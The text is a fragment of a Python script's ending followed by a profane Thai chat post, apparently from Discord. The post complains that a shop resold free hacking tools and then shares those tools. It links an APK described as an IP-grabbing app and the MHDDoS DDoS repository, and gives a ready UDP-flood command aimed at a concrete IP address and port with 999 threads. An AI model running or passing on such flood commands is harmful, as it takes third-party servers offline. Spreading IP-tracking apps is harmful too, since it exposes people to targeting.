...
if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        ...
        ToolsConsole.usage()# ผมเอาแจกต่อ เครดิต https://discord.gg/ZrE5KXJbZq
- มันมีร้านนึง เอาของฟรีมาขาย ไม่ใช่ขายถูกๆ นะ มันขาย 100 บาท ไอ้สัส ของฟรี ตอนกูซื้อนึกว่ามันทำเอง ตอนมันส่งเว็บ GitHub มา ไอ้สัสของฟรี กูก็ถามนะว่า อันนี้ของฟรีไม่ใช่หรอ มันก็สตั้นไปแป๊บนึง มันบอก แอพดักมันไม่ฟรี ห๊า แอพดัก IP 100 บาท 

@everyone 

- แอพดักมัน 100 บาทว่างั้น 😂
https://www.mediafire.com/file/5lr1x4s4b7xefbx/DeityStore+Net.apk/file

- GitHub ddos ของฟรีไอ้สัส
https://github.com/MatrixTM/MHDDoS


คำสั่ง
```python3 /workspaces/MHDDoS/start.py UDP IP:POT 53 999```
ตัวอย่าง
```python3 /workspaces/MHDDoS/start.py UDP 202.181.73.134:10017 53 999```

ตัวที่ร้าน Deity Store ขาย ที่มันเอาคลิปลง tiktok https://www.tiktok.com/@deity_v4?_t=ZS-8t1Mu2AoXua&_r=1
